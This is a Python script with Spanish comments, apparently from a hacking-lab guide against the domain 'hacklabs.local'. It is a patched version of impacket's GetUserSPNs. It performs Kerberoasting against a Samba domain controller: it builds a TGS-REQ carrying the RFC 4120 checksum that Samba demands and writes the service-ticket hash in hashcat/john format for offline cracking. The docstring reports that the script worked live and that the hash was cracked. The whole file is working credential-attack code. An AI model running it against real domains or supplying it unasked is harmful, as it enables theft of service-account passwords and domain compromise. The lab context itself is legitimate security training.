#!/usr/bin/env python3
"""Kerberoasting real contra este DC: pide un TGS de servicio y lo vuelca
en formato hashcat/john, igual que impacket-GetUserSPNs -- pero con el
checksum RFC 4120 S5.5.1 (key usage 6, keyed con la sesión, sobre la
codificación "pelada" de KDC-REQ-BODY) que Samba exige y que impacket
nunca envía en su Authenticator del TGS-REQ. Sin ese checksum, el KDC de
Samba responde KRB_AP_ERR_INAPP_CKSUM y el TGS-REQ nunca se completa;
con él, el KDC responde con un TGS-REP real y válido -- confirmado en
vivo, incluido el crackeo del hash resultante con hashcat -m 13100.

impacket-GetUserSPNs sigue sin funcionar tal cual porque además falla
en su enumeración LDAP automática (bind NTLM/Sicily, ver AD 02) antes
de llegar siquiera a este punto -- por eso este script toma el SPN ya
enumerado por LDAP (ldapsearch/bloodyAD, ver paso 2 de la guía) como
argumento directo en vez de repetir esa enumeración.

Uso:
  python3 GetUserSPNs_fixed.py 'DOMINIO/usuario:contraseña' \
    -spn 'MSSQLSvc/dc01.hacklabs.local:1433' -dc-ip <IP> -outputfile tgs.hash
"""
import argparse
import datetime
import sys
from binascii import hexlify

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue
from Cryptodome.Random import random as rand

import impacket.krb5.kerberosv5 as _k5
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5 import constants
from impacket.krb5.asn1 import (AP_REQ, AS_REP, TGS_REP, TGS_REQ, Authenticator, EncTGSRepPart,
                                 seq_set, seq_set_iter, KDC_REQ_BODY)
from impacket.krb5.crypto import Cksumtype, make_checksum, Key, _enctype_table

_CKSUM_FOR_ENCTYPE = {
    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value): Cksumtype.SHA1_AES256,
    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value): Cksumtype.SHA1_AES128,
    int(constants.EncryptionTypes.rc4_hmac.value): Cksumtype.HMAC_MD5,
}


def getKerberosTGS_fixed(serverName, domain, kdcHost, tgt, cipher, sessionKey, renew=False):
    try:
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    except Exception:
        decodedTGT = decoder.decode(tgt, asn1Spec=TGS_REP())[0]

    domain = domain.upper()
    ticket = Ticket()
    ticket.from_asn1(decodedTGT['ticket'])

    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    apReq['ap-options'] = constants.encodeFlags([])
    seq_set(apReq, 'ticket', ticket.to_asn1)

    tgsReq = TGS_REQ()
    tgsReq['pvno'] = 5
    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

    reqBody = seq_set(tgsReq, 'req-body')
    opts = [constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value,
            constants.KDCOptions.renewable_ok.value, constants.KDCOptions.canonicalize.value]
    if renew:
        opts.append(constants.KDCOptions.renew.value)
    reqBody['kdc-options'] = constants.encodeFlags(opts)
    seq_set(reqBody, 'sname', serverName.components_to_asn1)
    reqBody['realm'] = domain
    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    reqBody['till'] = KerberosTime.to_asn1(now)
    reqBody['nonce'] = rand.getrandbits(31)
    seq_set_iter(reqBody, 'etype',
                 (int(constants.EncryptionTypes.rc4_hmac.value),
                  int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                  int(constants.EncryptionTypes.des_cbc_md5.value),
                  int(cipher.enctype)))

    # RFC 4120 5.5.1: checksum sobre KDC-REQ-BODY "pelado" (tag universal
    # SEQUENCE), no sobre el campo tal y como queda embebido en TGS-REQ.
    plainReqBody = KDC_REQ_BODY()
    plainReqBody['kdc-options'] = reqBody['kdc-options']
    plainReqBody['realm'] = reqBody['realm']
    plainReqBody['till'] = reqBody['till']
    plainReqBody['nonce'] = reqBody['nonce']
    plainReqBody['sname'] = reqBody['sname']
    plainReqBody['etype'] = reqBody['etype']
    encodedReqBody = encoder.encode(plainReqBody)

    cksumtype = _CKSUM_FOR_ENCTYPE.get(int(sessionKey.enctype))
    if cksumtype is None:
        raise Exception('Sin mapeo de checksum para enctype %d' % sessionKey.enctype)
    cksum_value = make_checksum(cksumtype, sessionKey, 6, encodedReqBody)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = decodedTGT['crealm'].asOctets()
    clientName = Principal()
    clientName.from_asn1(decodedTGT, 'crealm', 'cname')
    seq_set(authenticator, 'cname', clientName.components_to_asn1)
    now2 = datetime.datetime.now(datetime.timezone.utc)
    authenticator['cusec'] = now2.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now2)
    authenticator['cksum'] = noValue
    authenticator['cksum']['cksumtype'] = cksumtype
    authenticator['cksum']['checksum'] = cksum_value

    encodedAuthenticator = encoder.encode(authenticator)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
    encodedApReq = encoder.encode(apReq)

    tgsReq['padata'] = noValue
    tgsReq['padata'][0] = noValue
    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq['padata'][0]['padata-value'] = encodedApReq

    message = encoder.encode(tgsReq)
    r = _k5.sendReceive(message, domain, kdcHost)

    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
    plainText = cipher.decrypt(sessionKey, 8, tgs['enc-part']['cipher'])
    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
    newCipher = _enctype_table[encTGSRepPart['key']['keytype']]
    return r, newCipher, sessionKey, newSessionKey


def outputTGS(ticketBytes, username, spn, outputfile):
    decodedTGS = decoder.decode(ticketBytes, asn1Spec=TGS_REP())[0]
    etype = int(decodedTGS['ticket']['enc-part']['etype'])
    realm = str(decodedTGS['ticket']['realm'])
    cipher = decodedTGS['ticket']['enc-part']['cipher']

    if etype == constants.EncryptionTypes.rc4_hmac.value:
        entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
            etype, username, realm, spn.replace(':', '~'),
            hexlify(cipher[:16].asOctets()).decode(), hexlify(cipher[16:].asOctets()).decode())
    elif etype in (constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                   constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value):
        entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
            etype, username, realm, spn,
            hexlify(cipher[-12:].asOctets()).decode(), hexlify(cipher[:-12].asOctets()).decode())
    else:
        print('[-] Tipo de cifrado %d no soportado para volcado hashcat' % etype)
        return

    print(entry)
    if outputfile:
        with open(outputfile, 'a') as f:
            f.write(entry + '\n')


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('target', help='DOMINIO/usuario:contraseña')
    parser.add_argument('-spn', required=True, help='SPN a kerberoastear, p.ej. MSSQLSvc/dc01.hacklabs.local:1433')
    parser.add_argument('-dc-ip', required=True, help='IP del Domain Controller')
    parser.add_argument('-outputfile', help='Fichero donde añadir el hash en formato hashcat/john')
    args = parser.parse_args()

    domain, rest = args.target.split('/', 1)
    username, password = rest.split(':', 1) if ':' in rest else (rest, '')

    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    print('[*] Pidiendo TGT para %s...' % username)
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
        userName, password, domain.upper(), b'', b'', '', kdcHost=args.dc_ip)

    serverName = Principal(args.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    print('[*] Pidiendo TGS para %s (con el checksum RFC 4120 5.5.1 que Samba exige)...' % args.spn)
    try:
        tgs, _, _, _ = getKerberosTGS_fixed(serverName, domain.upper(), args.dc_ip, tgt, cipher, sessionKey)
    except Exception as e:
        print('[-] Fallo pidiendo el TGS: %s' % e)
        sys.exit(1)

    print('[+] TGS-REP recibido. Hash Kerberoasting:')
    outputTGS(tgs, username, args.spn, args.outputfile)


if __name__ == '__main__':
    main()
